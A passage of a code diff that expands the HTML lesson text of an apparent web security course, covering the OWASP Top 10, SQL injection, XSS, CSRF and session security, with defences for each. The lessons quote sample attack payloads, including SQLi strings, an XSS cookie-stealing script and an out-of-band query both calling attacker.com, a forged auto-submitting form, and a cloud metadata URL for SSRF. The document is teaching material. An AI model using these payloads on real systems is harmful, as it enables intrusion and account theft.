@@ -418,64 +418,283 @@ const COURSE_CONTENT = {
 </ul>`,
 
   // ── Course 2: Web Application Security ───────────────────────────────
-  7: `<p>The OWASP Top 10 is a regularly updated list of the most critical web application security risks, compiled by security experts worldwide. Understanding these risks is the first step to building secure applications — the list shapes security standards, penetration testing methodologies, and compliance frameworks globally.</p>
-<p>Each risk is scored by its likelihood of exploitation, the prevalence of the vulnerability, and the potential business impact. Developers who understand the Top 10 write more secure code from the start, reducing the cost of security fixes dramatically — vulnerabilities caught in development cost 100x less to fix than those found in production.</p>
+  7: `<p>The <strong>OWASP Top 10</strong> is the most widely recognised list of critical web application security risks, updated every three to four years by hundreds of security professionals worldwide. It is not just educational material — it is the backbone of compliance frameworks like PCI-DSS, SOC 2, and ISO 27001. If you build web applications professionally, the Top 10 is required knowledge. A single exploited vulnerability in any of these categories can lead to data breaches affecting millions of users, regulatory fines in the tens of millions, and permanent reputational damage.</p>
+<p>The 2021 edition reorganised the list into three newly named categories and promoted several long-standing issues to top positions. Understanding the <em>why</em> behind each ranking — not just the name — is what separates a developer who can write secure code from one who just ticks compliance checkboxes.</p>
+
+<h5 class="content-heading">OWASP Top 10 — 2021 Edition, Fully Explained</h5>
+<p><strong>A01 — Broken Access Control</strong> (moved from #5 to #1): 94% of applications tested had some form of access control failure. This covers horizontal privilege escalation (accessing another user's data by changing an ID parameter), vertical privilege escalation (accessing admin functions as a regular user), and missing function-level access control (API endpoints that forget to check authorisation). The fix: enforce access control server-side on every request. Never trust the client to restrict what it can access.</p>
+<p><strong>A02 — Cryptographic Failures</strong> (previously "Sensitive Data Exposure"): This covers transmitting data in clear text, using broken/deprecated algorithms (MD5, SHA-1, DES, RC4), hardcoding keys in source code, improper key management, and missing encryption at rest. The rename to "Cryptographic Failures" is intentional — the root cause is the crypto layer failing, not just the data exposure symptom. Real impact: in 2013, Adobe stored 153 million passwords encrypted with 3DES in ECB mode (identical passwords produced identical ciphertext) — making the "encrypted" passwords trivially crackable.</p>
+<p><strong>A03 — Injection</strong> (was #1 for a decade): SQL injection, command injection, LDAP injection, template injection. Injection happens wherever user-supplied data is sent to an interpreter that executes it as code or commands. Still responsible for massive breaches — the 2017 Equifax breach (147 million records) was triggered by an Apache Struts remote code execution vulnerability, a form of injection.</p>
+<p><strong>A04 — Insecure Design</strong> (new in 2021): Unlike other categories which cover implementation flaws, this is about fundamental design weaknesses — features that were never designed to be secure. Example: a password reset flow that allows unlimited guesses at the reset code without lockout. No amount of secure implementation fixes a broken design; it must be redesigned. This is where <strong>threat modelling</strong> during architecture review catches problems before a line of code is written.</p>
+<p><strong>A05 — Security Misconfiguration</strong>: Default credentials on admin panels, directory listing enabled, verbose stack traces in production, unnecessary services running, cloud storage buckets set to public read. The Capital One breach in 2019 — 100 million records — stemmed from a misconfigured WAF and over-privileged IAM role in AWS. Misconfiguration is consistently the highest-prevalence finding in penetration tests.</p>
+<p><strong>A06 — Vulnerable and Outdated Components</strong>: The average enterprise application has hundreds of third-party dependencies, each a potential vulnerability source. The 2021 Log4Shell vulnerability in the Log4j library affected hundreds of millions of servers globally. 79% of the time developers do not even know what components are in their applications (shadow dependencies). Use <code>npm audit</code>, Snyk, or Dependabot to continuously scan and patch dependencies.</p>
+<p><strong>A07 — Identification and Authentication Failures</strong>: Permitting weak passwords, missing account lockout (enabling credential stuffing), storing passwords in plaintext or with weak hashing (MD5), missing multi-factor authentication, exposing session tokens in URLs. The 2012 LinkedIn breach: 6.5 million password hashes stolen, nearly all cracked within days because they used unsalted SHA-1.</p>
+<p><strong>A08 — Software and Data Integrity Failures</strong> (new): Applications that auto-update without verifying the integrity of the update, pipelines that pull untrusted code from unverified sources, insecure deserialization (deserializing attacker-controlled objects that trigger malicious code). The 2020 SolarWinds supply chain attack is the canonical example — malicious code was injected into a legitimate software build pipeline, affecting 18,000 organisations including the US Treasury and Pentagon.</p>
+<p><strong>A09 — Security Logging and Monitoring Failures</strong>: Applications that do not log authentication failures, do not alert on suspicious patterns, store logs in formats that cannot be queried, or do not retain logs long enough. On average, a breach is undetected for 207 days. If you are not logging and monitoring, you will not know you have been breached until the attacker has already exfiltrated your data.</p>
+<p><strong>A10 — Server-Side Request Forgery (SSRF)</strong> (new): The server makes an HTTP request to a URL specified by the user — and the attacker points it at internal services. In cloud environments, SSRF is devastatingly effective: a request to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> returns the cloud instance's IAM credentials. The 2019 Capital One breach was enabled in part by SSRF against the AWS metadata endpoint.</p>
+
+<h5 class="content-heading">Threat Modelling with STRIDE</h5>
+<p>Threat modelling is the practice of systematically asking "what could go wrong?" before you write code. The <strong>STRIDE</strong> framework (developed at Microsoft) gives you six attack categories to check for every component of your system:</p>
+<ul class="content-list">
+<li><strong>Spoofing:</strong> Can an attacker pretend to be a legitimate user or service? (Mitigate: strong authentication)</li>
+<li><strong>Tampering:</strong> Can data be modified in transit or storage without detection? (Mitigate: integrity checks, MACs, signed tokens)</li>
+<li><strong>Repudiation:</strong> Can a user deny performing an action? (Mitigate: audit logs, digital signatures)</li>
+<li><strong>Information Disclosure:</strong> Can sensitive data be read by unauthorised parties? (Mitigate: encryption, access control)</li>
+<li><strong>Denial of Service:</strong> Can the service be made unavailable? (Mitigate: rate limiting, auto-scaling, caching)</li>
+<li><strong>Elevation of Privilege:</strong> Can a low-privilege user gain admin access? (Mitigate: principle of least privilege, access control checks)</li>
+</ul>
+<p>A practical threat modelling session takes 2-4 hours for a feature, involves developers, architects, and a security engineer, and produces a list of mitigations to implement. The cost is trivial compared to fixing the same issues post-breach.</p>
+
+<h5 class="content-heading">The Real Cost of Insecurity</h5>
+<p>IBM's 2023 Cost of a Data Breach Report: the global average cost of a data breach is <strong>$4.45 million</strong>. For healthcare, it averages $10.93 million. The Equifax breach cost $700 million in settlements. British Airways was fined £20 million under GDPR for a breach affecting 400,000 customers — caused by a single Magecart skimming script injected via a third-party analytics library. Security investment ROI is asymmetric: spending $50K on security tooling and training can prevent a $4.45M breach.</p>
+
 <h5 class="content-heading">Key Concepts</h5>
 <ul class="content-list">
-<li><strong>OWASP:</strong> Open Web Application Security Project — a non-profit that produces free security resources.</li>
-<li><strong>Threat modelling:</strong> Systematically identifying what could go wrong in your application before building it.</li>
-<li><strong>Attack surface:</strong> Every point where an attacker could try to enter or extract data.</li>
-<li><strong>Security by design:</strong> Building security in from the start rather than bolting it on later.</li>
+<li><strong>OWASP:</strong> Open Web Application Security Project — the global authority on web application security, producing the Top 10, testing guides, and security tools.</li>
+<li><strong>OWASP Top 10:</strong> The ten most critical web application security risk categories — the foundation of web security education and compliance.</li>
+<li><strong>Broken Access Control:</strong> The #1 risk in 2021 — failing to enforce who can access what, enabling horizontal and vertical privilege escalation.</li>
+<li><strong>Threat modelling:</strong> Systematically identifying threats before building — STRIDE is the most widely used framework.</li>
+<li><strong>STRIDE:</strong> Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege — six threat categories to evaluate for every system component.</li>
+<li><strong>Attack surface:</strong> Every entry point an attacker could target — inputs, APIs, dependencies, infrastructure, and people.</li>
+<li><strong>Security by design:</strong> Embedding security decisions into architecture and design rather than retrofitting controls after the fact.</li>
+<li><strong>Defence in depth:</strong> Layering multiple independent security controls so that bypassing one does not compromise the whole system.</li>
+<li><strong>Principle of least privilege:</strong> Every user, service, and process should have only the minimum access rights needed to perform its function.</li>
+<li><strong>Supply chain attack:</strong> Compromising the software build or distribution pipeline to inject malicious code into trusted software — SolarWinds is the canonical example.</li>
+<li><strong>SSRF:</strong> Server-Side Request Forgery — the server makes a request to an attacker-controlled URL, potentially exposing internal services and cloud metadata.</li>
+<li><strong>Security misconfiguration:</strong> Leaving default settings, overly permissive access, or unnecessary features enabled — the highest-prevalence finding in penetration tests.</li>
 </ul>`,
 
-  8: `<p>SQL injection occurs when an attacker inserts malicious SQL code into an input field that is concatenated into a database query. A login form that builds <code>SELECT * FROM users WHERE email='INPUT'</code> can be exploited by entering <code>' OR '1'='1</code> to bypass authentication entirely and access any account.</p>
-<p>The fix is simple and absolute: always use parameterised queries (prepared statements). The database driver sends the query and data separately, making it impossible for user input to be interpreted as SQL. ORMs like Sequelize and TypeORM use parameterised queries by default — only raw query methods require explicit care.</p>
+  8: `<p><strong>SQL injection (SQLi)</strong> is one of the oldest and most devastating web vulnerabilities — it has been in the OWASP Top 10 since the list was first published in 2003 and remains responsible for some of the largest data breaches in history. In 2008, a single SQLi attack compromised 130 million credit card numbers from Heartland Payment Systems. In 2012, a SQLi attack on LinkedIn exposed 6.5 million password hashes. Despite being fully preventable, SQLi attacks still account for a significant percentage of all web application breaches today.</p>
+<p>The vulnerability is conceptually simple: when user input is concatenated directly into a SQL query string, the attacker can break out of the intended data context and inject their own SQL commands. The database cannot distinguish between the developer's legitimate SQL and the attacker's injected commands — it executes them both.</p>
+
+<h5 class="content-heading">From Basic to Advanced SQLi — How Attacks Progress</h5>
+<p><strong>Classic in-band SQLi</strong> — The most straightforward form. The application displays database results directly in the response. Consider this login query:</p>
+<p><code>SELECT * FROM users WHERE email='[INPUT]' AND password='[INPUT]'</code></p>
+<p>Injecting <code>' OR '1'='1' --</code> as the email produces: <code>SELECT * FROM users WHERE email='' OR '1'='1' --' AND password='...'</code>. The <code>--</code> is a SQL comment, making everything after it ignored. The condition <code>'1'='1'</code> is always true — this query returns all users. The first one in the result set (often the admin account) is logged in. The attacker has bypassed authentication completely without knowing any password.</p>
+<p><strong>UNION-based SQLi</strong> — When the application displays query results, the attacker can append a UNION SELECT to extract data from arbitrary tables: <code>' UNION SELECT username, password, NULL FROM admin_users --</code>. If the columns match, the admin credentials appear alongside the normal query results. This technique allows dumping entire database tables.</p>
+<p><strong>Blind Boolean-based SQLi</strong> — The application does not show query results, but its behaviour differs based on whether the query returns true or false. The attacker asks yes/no questions: <code>' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' --</code>. If the page loads normally, the first character of the password is 'a'. If not, try 'b'. Tedious but completely automatable with tools like sqlmap — entire databases can be extracted this way.</p>
+<p><strong>Blind Time-based SQLi</strong> — When even true/false differences are invisible, the attacker uses database sleep functions: <code>' AND SLEEP(5) --</code> (MySQL). If the response takes 5 seconds, the injection worked. From there, conditional delays encode binary data: <code>' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --</code>. Each character takes ~26 guesses on average — automated tools like sqlmap handle this at high speed.</p>
+<p><strong>Second-order SQLi</strong> — The payload is stored in the database in a first request (safely escaped at that point) and then used unsafely in a later query. Example: a username containing <code>admin'--</code> is stored safely. But when the app later builds a query using the stored username — perhaps for a password change — the injection fires. Second-order SQLi is particularly dangerous because it bypasses input validation at the storage stage.</p>
+<p><strong>Out-of-band SQLi (OOB)</strong> — The attacker triggers the database to make an outbound DNS or HTTP request to an attacker-controlled server, carrying data as part of the URL. On MySQL: <code>SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\test'))</code>. This bypasses firewalls that block inbound connections and is extremely difficult to detect in standard application logs.</p>
+
+<h5 class="content-heading">The Fix: Parameterised Queries Are Non-Negotiable</h5>
+<p>Parameterised queries (prepared statements) are the only reliable fix. The query structure is sent to the database first; user input is sent separately as typed data. The database never parses user input as SQL — it is impossible for injection to occur, regardless of what characters the user submits.</p>
+<p>Node.js with <code>pg</code> (PostgreSQL): <code>await pool.query('SELECT * FROM users WHERE email = $1', [userEmail])</code>. The <code>$1</code> is a parameter placeholder — the value is bound separately.</p>
+<p>Python with psycopg2: <code>cursor.execute("SELECT * FROM users WHERE email = %s", (user_email,))</code>. Note the trailing comma — this must be a tuple, not a string.</p>
+<p>Java with JDBC: <code>PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE email = ?"); stmt.setString(1, userEmail);</code></p>
+<p>ORMs like Sequelize, SQLAlchemy, and Hibernate use parameterised queries internally for their standard find methods. Only raw query helpers (<code>sequelize.query()</code>, <code>session.execute(text(...))</code>) require explicit parameterisation — these are a common source of SQLi in ORM-heavy codebases.</p>
+
+<h5 class="content-heading">Defence in Depth</h5>
+<p>Beyond parameterised queries, apply layered defences:</p>
+<ul class="content-list">
+<li><strong>Principle of least privilege:</strong> The database user your application connects with should only have SELECT/INSERT/UPDATE/DELETE on specific tables it needs. It should never have DROP, ALTER, or access to system tables. An attacker who achieves SQLi with a limited DB user can do far less damage.</li>
+<li><strong>Web Application Firewall (WAF):</strong> A WAF can detect and block common SQLi payloads, but should not be your primary defence — a skilled attacker can often bypass WAFs with obfuscation techniques.</li>
+<li><strong>Input validation:</strong> Validate that input matches expected format (e.g. email fields must look like emails). This reduces attack surface but is not a substitute for parameterised queries.</li>
+<li><strong>Error handling:</strong> Never return raw database errors to the client — they reveal schema structure, table names, and sometimes data. Log errors server-side and return only generic error messages to users.</li>
+<li><strong>Regular testing:</strong> Use sqlmap or Burp Suite Pro during penetration testing to automatically probe for SQLi. Consider integrating SAST (Static Application Security Testing) tools into your CI pipeline.</li>
+</ul>
+
 <h5 class="content-heading">Key Concepts</h5>
 <ul class="content-list">
-<li><strong>Parameterised query:</strong> Query and data are sent separately — user input is never interpreted as SQL.</li>
-<li><strong>Blind SQLi:</strong> The attacker cannot see query results but infers data from true/false responses.</li>
-<li><strong>Time-based SQLi:</strong> Uses database sleep functions to infer data when no output is visible.</li>
-<li><strong>Principle of least privilege:</strong> The DB user your app connects with should only have the permissions it needs.</li>
+<li><strong>SQL injection:</strong> Inserting malicious SQL into input that is concatenated into a query — allows authentication bypass, data extraction, and sometimes full server compromise.</li>
+<li><strong>Parameterised query:</strong> Query structure and user data sent to the DB separately — user input is never parsed as SQL. The only reliable SQLi defence.</li>
+<li><strong>UNION-based SQLi:</strong> Appending a UNION SELECT to extract data from other tables when results are displayed in the response.</li>
+<li><strong>Blind SQLi:</strong> Inferring data without seeing results — using true/false page differences or time delays to extract data one bit at a time.</li>
+<li><strong>Time-based SQLi:</strong> Using database SLEEP() or WAITFOR DELAY to encode data in response timing — effective when no visual difference exists.</li>
+<li><strong>Second-order SQLi:</strong> Payload stored safely, then used unsafely in a later query — bypasses point-of-entry validation.</li>
+<li><strong>Principle of least privilege:</strong> DB application user should have only the minimum permissions needed — limits blast radius of any injection attack.</li>
+<li><strong>sqlmap:</strong> Open-source tool that automatically detects and exploits SQLi vulnerabilities — used by penetration testers to verify defences.</li>
+<li><strong>ORM:</strong> Object-Relational Mapper — generates SQL from method calls, using parameterised queries internally. Only raw query methods require explicit parameterisation.</li>
+<li><strong>WAF:</strong> Web Application Firewall — can block common SQLi patterns but should not be the primary defence as obfuscated payloads can bypass rules.</li>
+<li><strong>Error handling:</strong> Never expose raw DB errors to clients — they reveal schema information. Log server-side, return generic messages to users.</li>
 </ul>`,
 
-  9: `<p>Cross-Site Scripting (XSS) allows an attacker to inject malicious JavaScript into a web page viewed by other users. Stored XSS saves the payload in the database (e.g. a comment field) — every user who views that page runs the attacker's code. Reflected XSS embeds the payload in a URL that a victim is tricked into clicking.</p>
-<p>XSS can steal session cookies, redirect users to phishing pages, capture keystrokes, or completely rewrite the page content. The primary defence is output encoding — never insert untrusted data into HTML without escaping it. Content Security Policy (CSP) provides a second layer by blocking inline scripts and restricting which domains can serve JavaScript.</p>
+  9: `<p><strong>Cross-Site Scripting (XSS)</strong> is the injection of malicious JavaScript into web pages that are then viewed by other users. It is consistently in the OWASP Top 10 and is the most widespread client-side vulnerability on the web. When a browser executes attacker-controlled JavaScript in the context of your site, the attacker has the same access as your legitimate code — your cookies, local storage, DOM, keyboard input, and camera/microphone permissions. XSS is not just a nuisance; it is a complete account takeover vulnerability.</p>
+<p>The Samy worm in 2005 demonstrated XSS at scale: a self-propagating XSS worm on MySpace added "Samy is my hero" to every infected profile and propagated itself to the viewer's friends list. It infected over one million profiles in under 20 hours — the fastest-spreading internet worm in history at that point.</p>
+
+<h5 class="content-heading">The Three Types of XSS</h5>
+<p><strong>Stored XSS (Persistent XSS)</strong> — The most dangerous form. The malicious payload is saved to the server's database and served to every user who views the affected page. A comment field that allows HTML is the classic example: the attacker posts a comment containing <code>&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code>. Every user who loads that page sends their session cookie to the attacker's server. The attacker can then impersonate them without knowing their password.</p>
+<p>The 2018 British Airways breach — 400,000 customer payment card records stolen — was Stored XSS combined with Magecart (a skimming script injected through a compromised third-party library). The attacker replaced a single JavaScript file served to every checkout page visitor. For 15 days, every card detail entered on the checkout page was silently exfiltrated to a server in Moldova.</p>
+<p><strong>Reflected XSS (Non-Persistent XSS)</strong> — The payload is embedded in a URL and reflected in the server's response without being stored. The attacker crafts a malicious link — <code>https://vulnerable.com/search?q=&lt;script&gt;...&lt;/script&gt;</code> — and tricks the victim into clicking it (via email, social media, or shortened URLs). The server includes the search term verbatim in the response HTML, and the browser executes it. The attack is "one-shot" — it only fires for users who click that specific link.</p>
+<p><strong>DOM-Based XSS</strong> — The vulnerability exists entirely in client-side JavaScript. The server response is safe, but client-side code reads attacker-controlled data (typically from the URL fragment or localStorage) and inserts it into the DOM unsafely. Example: <code>document.getElementById('msg').innerHTML = location.hash.substring(1);</code> — visiting <code>page.html#&lt;img src=x onerror=alert(1)&gt;</code> executes the payload without any server involvement. DOM XSS is harder to detect because it does not appear in server logs.</p>
+
+<h5 class="content-heading">What an Attacker Can Do with XSS</h5>
+<p>With JavaScript execution in a victim's browser context, an attacker can:</p>
+<ul class="content-list">
+<li><strong>Session hijacking:</strong> Read non-HttpOnly cookies and send them to an attacker-controlled server — the attacker can log in as the victim from their own browser.</li>
+<li><strong>Credential harvesting:</strong> Replace the login form with a fake one that sends credentials to the attacker, then redirects to the real login — the victim sees nothing unusual.</li>
+<li><strong>Keylogging:</strong> Attach a <code>keydown</code> event listener to <code>document</code> and exfiltrate every keypress — captures passwords typed on the page even if the session cookie is HttpOnly.</li>
+<li><strong>Cryptomining:</strong> Run a JavaScript cryptocurrency miner, consuming the victim's CPU for as long as the tab is open.</li>
+<li><strong>Webcam/microphone access:</strong> If the site has camera permissions, the attacker can invoke <code>getUserMedia()</code> and stream the feed to their server.</li>
+<li><strong>BeEF framework attacks:</strong> The Browser Exploitation Framework hooks the victim's browser, providing persistent control and access to dozens of browser-based attacks.</li>
+</ul>
+
+<h5 class="content-heading">Defences — Layered Security</h5>
+<p><strong>Output encoding</strong> is the primary defence for server-side rendered content. Every piece of untrusted data inserted into HTML must be HTML-entity encoded: <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>&amp;</code> → <code>&amp;amp;</code>, <code>"</code> → <code>&amp;quot;</code>. Modern templating engines (Jinja2, Handlebars, Twig, EJS) do this by default — only explicitly unescaped syntax (<code>{{{ }}}</code> in Handlebars, <code>| safe</code> in Jinja2) bypasses it. In React, JSX automatically escapes values — only <code>dangerouslySetInnerHTML</code> bypasses this protection and should almost never be used with user data.</p>
+<p><strong>Content Security Policy (CSP)</strong> is the most powerful second layer. A properly configured CSP header tells the browser which sources of JavaScript are legitimate: <code>Content-Security-Policy: script-src 'nonce-RANDOM123' 'strict-dynamic'</code>. Scripts without the correct nonce are refused by the browser — even if an attacker injects a <code>&lt;script&gt;</code> tag, it will not execute. Nonces must be random and unique per page load. CSP can also block inline event handlers (<code>onclick="..."</code>) and <code>eval()</code>, which are common XSS execution vectors.</p>
+<p><strong>HttpOnly cookie flag</strong> prevents JavaScript from reading session cookies via <code>document.cookie</code>. This removes the most common XSS objective — session hijacking — but does not prevent other XSS attacks. Always set this flag on session cookies.</p>
+<p><strong>DOMPurify</strong> — When you genuinely need to render user-supplied HTML (rich text editors, markdown renderers), use the DOMPurify library to sanitise the HTML before insertion. It maintains an allowlist of safe tags and attributes and removes everything else: <code>const clean = DOMPurify.sanitize(dirtyHTML);</code></p>
+<p><strong>Subresource Integrity (SRI)</strong> — If you load JavaScript from a CDN, add an <code>integrity</code> attribute to your script tag containing the SHA-256 hash of the file. If the CDN is compromised and serves a modified file, the browser computes a different hash and refuses to execute it — preventing the British Airways style attack.</p>
+
 <h5 class="content-heading">Key Concepts</h5>
 <ul class="content-list">
-<li><strong>Stored XSS:</strong> Payload is persisted in the database and served to all visitors of a page.</li>
-<li><strong>Reflected XSS:</strong> Payload is embedded in a URL and reflected back in the server response.</li>
-<li><strong>Output encoding:</strong> Escaping characters like &lt; &gt; &amp; so they render as text, not HTML.</li>
-<li><strong>HttpOnly cookie flag:</strong> Prevents JavaScript from reading the session cookie, limiting XSS impact.</li>
+<li><strong>XSS (Cross-Site Scripting):</strong> Injecting malicious JavaScript into a page viewed by other users — gives the attacker the same access as legitimate scripts on the page.</li>
+<li><strong>Stored XSS:</strong> Payload persisted in the database and served to all visitors — the most impactful XSS type, used in the British Airways breach.</li>
+<li><strong>Reflected XSS:</strong> Payload embedded in a URL and reflected in the response — requires tricking the victim into clicking the malicious link.</li>
+<li><strong>DOM-based XSS:</strong> Vulnerability in client-side JS that reads attacker-controlled data (URL hash, localStorage) and inserts it into the DOM unsafely.</li>
+<li><strong>Output encoding:</strong> HTML-entity escaping untrusted data before inserting into HTML — the primary XSS defence. Enabled by default in modern templating engines.</li>
+<li><strong>Content Security Policy:</strong> HTTP header instructing browsers to only execute scripts from approved sources — blocks XSS payload execution even if injection occurs.</li>
+<li><strong>CSP nonce:</strong> A random value included in both the CSP header and each legitimate script tag — allows those scripts while blocking all others.</li>
+<li><strong>HttpOnly flag:</strong> Prevents JavaScript from reading the cookie — removes session hijacking as an XSS objective but does not prevent all XSS attacks.</li>
+<li><strong>DOMPurify:</strong> JavaScript library that sanitises HTML by removing dangerous tags and attributes — use when rendering user-supplied HTML is unavoidable.</li>
+<li><strong>SRI (Subresource Integrity):</strong> Hash in script tag's integrity attribute ensures CDN-served files have not been tampered with.</li>
+<li><strong>Samy worm:</strong> 2005 self-propagating XSS worm that infected 1 million MySpace profiles in 20 hours — demonstrates XSS at scale.</li>
 </ul>`,
 
-  10: `<p>Cross-Site Request Forgery (CSRF) tricks an authenticated user's browser into sending a request to your application without their knowledge. Because the browser automatically attaches cookies, the server cannot distinguish a legitimate request from a forged one. A malicious site can silently transfer money, change an email address, or delete data on behalf of the logged-in user.</p>
-<p>Broken authentication covers a wide range of flaws: weak passwords, missing account lockout, session tokens that never expire, and credentials stored in plain text. Multi-factor authentication (MFA) is the single most effective control — even if a password is stolen, the attacker still cannot log in without the second factor.</p>
+  10: `<p><strong>Cross-Site Request Forgery (CSRF)</strong> is a browser-level attack that exploits the fact that browsers automatically include cookies with every request to a domain — even requests initiated from a completely different site. An attacker who gets a victim to visit a malicious page can silently trigger authenticated actions on any site the victim is logged into: transfer money, change their email or password, delete accounts, post content, or make purchases — all without the victim's knowledge.</p>
+<p>CSRF was responsible for the 2008 attack on a major router vendor where a malicious page caused all routers that viewed it to change their DNS settings, redirecting users from their bank's real website to phishing pages. Every authenticated web app that allows state-changing operations is potentially vulnerable.</p>
+
+<h5 class="content-heading">How CSRF Works — Mechanics</h5>
+<p><strong>GET-based CSRF</strong> (the simplest form): If your application allows state-changing operations via GET requests (which it should not — but many do), the attack is a single HTML image tag: <code>&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;</code>. The moment the victim's browser renders this tag (even if the "image" fails), it fires a GET request with the victim's session cookie attached. The bank's server sees a valid authenticated request and processes the transfer.</p>
+<p><strong>POST-based CSRF</strong>: Most apps correctly use POST for state changes, but this is still bypassable. A hidden auto-submitting form on the attacker's page:</p>
+<p><code>&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;&lt;input name="to" value="attacker"&gt;&lt;input name="amount" value="1000"&gt;&lt;/form&gt;&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</code></p>
+<p>When the victim visits the malicious page, the form submits silently and the bank receives a valid POST with the victim's cookies.</p>
+<p><strong>JSON/API CSRF</strong>: If your API accepts <code>application/x-www-form-urlencoded</code> or <code>text/plain</code> content types (which browsers can send cross-origin), it may be vulnerable to CSRF even if it expects JSON. Always explicitly validate <code>Content-Type: application/json</code> and reject other content types for JSON endpoints.</p>
+
+<h5 class="content-heading">CSRF Defences</h5>
+<p><strong>SameSite Cookie Attribute</strong> — The modern, clean solution. Setting <code>SameSite=Strict</code> on your session cookie tells the browser to never send the cookie on cross-site requests — CSRF is completely prevented. <code>SameSite=Lax</code> (the browser default since 2020) allows cookies on top-level navigation (e.g. clicking a link) but blocks them in iframes, forms, and subresource requests — blocking CSRF for POST requests but not GET. Use <code>SameSite=Strict</code> for maximum security; use <code>Lax</code> if you need to maintain sessions when users click links from external sites.</p>
+<p><strong>CSRF Tokens (Synchronizer Token Pattern)</strong> — For older browsers that do not fully support SameSite, or as a defence-in-depth layer: generate a random token per session (or per form), embed it in every state-changing form as a hidden field, and verify it on the server before processing. The attacker cannot read the token from their origin (same-origin policy), so they cannot forge the correct value. Frameworks: Django uses this by default (<code>{% csrf_token %}</code>), Rails uses the <code>authenticity_token</code>, Laravel uses <code>@csrf</code>. If you are building an API, send the token in a custom header (e.g. <code>X-CSRF-Token</code>) — custom headers cannot be sent cross-origin by the browser.</p>
+<p><strong>Double Submit Cookie Pattern</strong> — For stateless APIs: generate a random value, set it as a cookie AND include it as a request header. The server checks they match. Because the attacker cannot read your cookie (same-origin policy), they cannot set the matching header. This is less secure than synchronizer tokens but works for stateless architectures.</p>
+
+<h5 class="content-heading">Clickjacking</h5>
+<p>Clickjacking is a visual deception attack where the attacker embeds your site in a transparent iframe and lays it over a decoy UI. The victim thinks they are clicking a button on the attacker's page but are actually clicking on elements of your site. This can be used to trigger purchases, change settings, or grant permissions. The defence: set <code>X-Frame-Options: DENY</code> (or <code>SAMEORIGIN</code> if you need to iframe your own pages) or use the <code>frame-ancestors</code> CSP directive. These prevent your pages from being loaded in iframes entirely.</p>
+
+<h5 class="content-heading">Broken Authentication and Session Management</h5>
+<p>Authentication flaws are distinct from CSRF but equally critical. The most impactful issues:</p>
+<p><strong>Session fixation</strong>: An attacker pre-sets a known session ID (e.g. by embedding it in a URL they send the victim). The victim authenticates — if the app does not rotate the session ID on login, the attacker now has a valid authenticated session. Fix: always call <code>session.regenerate()</code> (or equivalent) immediately after a successful login.</p>
+<p><strong>Session token entropy</strong>: Session IDs must be generated by a CSPRNG. A 128-bit random token is unguessable. A timestamp-based or sequential session ID is trivially predictable and can be brute-forced. Node.js express-session uses 24 bytes of <code>crypto.randomBytes()</code> by default — never override this with a weaker generator.</p>
+<p><strong>Credential stuffing</strong>: Attackers download leaked credential databases (billions of username/password pairs from previous breaches like LinkedIn 2012, Yahoo 2013, Adobe 2013) and automatically test them against your login form. If users reuse passwords (most do), many accounts will be compromised. Defences: rate limiting on login endpoints, MFA, integration with HaveIBeenPwned's API to check if a user's email/password appears in known breaches.</p>
+<p><strong>Multi-factor authentication (MFA)</strong> is the single highest-impact authentication control. Microsoft's research shows MFA blocks 99.9% of automated account compromise attacks. Even if an attacker has the user's password, they cannot log in without the second factor (TOTP app, hardware security key, SMS). Implement MFA using the TOTP standard (RFC 6238) — libraries: <code>speakeasy</code> (Node.js), <code>pyotp</code> (Python). Prefer authenticator apps or hardware keys over SMS (SIM-swapping attacks can intercept SMS codes).</p>
+
 <h5 class="content-heading">Key Concepts</h5>
 <ul class="content-list">
-<li><strong>CSRF token:</strong> A secret, random value embedded in forms and verified server-side on submission.</li>
-<li><strong>SameSite cookie:</strong> Set to Strict or Lax to prevent cookies from being sent on cross-site requests.</li>
-<li><strong>Session fixation:</strong> Regenerate the session ID on login to prevent an attacker from pre-setting a known ID.</li>
-<li><strong>Credential stuffing:</strong> Using leaked username/password pairs from other breaches to attack your site.</li>
+<li><strong>CSRF:</strong> Forging authenticated requests by exploiting automatic cookie attachment — browsers cannot distinguish legitimate from forged requests without additional controls.</li>
+<li><strong>SameSite cookie:</strong> Attribute controlling when cookies are sent on cross-site requests — <code>Strict</code> blocks all cross-site requests, <code>Lax</code> blocks most. The modern CSRF defence.</li>
+<li><strong>CSRF token:</strong> Random value embedded in forms and verified server-side — attacker cannot read it from their origin so cannot forge the correct value.</li>
+<li><strong>Double submit cookie:</strong> Stateless CSRF defence — random value set as both cookie and request header; server verifies they match.</li>
+<li><strong>Clickjacking:</strong> Transparent iframe overlay attack — mitigated by X-Frame-Options or CSP frame-ancestors directive.</li>
+<li><strong>Session fixation:</strong> Attacker pre-sets a session ID before authentication — fix by regenerating the session ID on every successful login.</li>
+<li><strong>Session entropy:</strong> Session IDs must be generated by a CSPRNG — sequential or timestamp-based IDs are predictable and brute-forceable.</li>
+<li><strong>Credential stuffing:</strong> Automated testing of breached username/password pairs — mitigated by rate limiting, MFA, and breach database integration.</li>
+<li><strong>MFA (Multi-Factor Authentication):</strong> Requiring a second proof of identity beyond password — blocks 99.9% of automated account takeover attacks.</li>
+<li><strong>TOTP:</strong> Time-based One-Time Password — the standard behind authenticator apps like Google Authenticator and Authy (RFC 6238).</li>
+<li><strong>HaveIBeenPwned:</strong> Troy Hunt's service/API that checks if email/password appears in known breach databases — integrate into registration and login to warn users.</li>
 </ul>`,
 
-  11: `<p>HTTP response headers are one of the cheapest security wins available — a few lines of server configuration can defend against clickjacking, MIME-type sniffing, protocol downgrade attacks, and information leakage. Most of these headers cost nothing in performance and take minutes to configure.</p>
-<p>Content Security Policy (CSP) is the most powerful but also the most complex header. A strict CSP whitelists exactly which domains can serve scripts, styles, images, and fonts for your page. Any injected script that does not come from an approved source is blocked by the browser, adding a strong defence-in-depth layer on top of output encoding.</p>
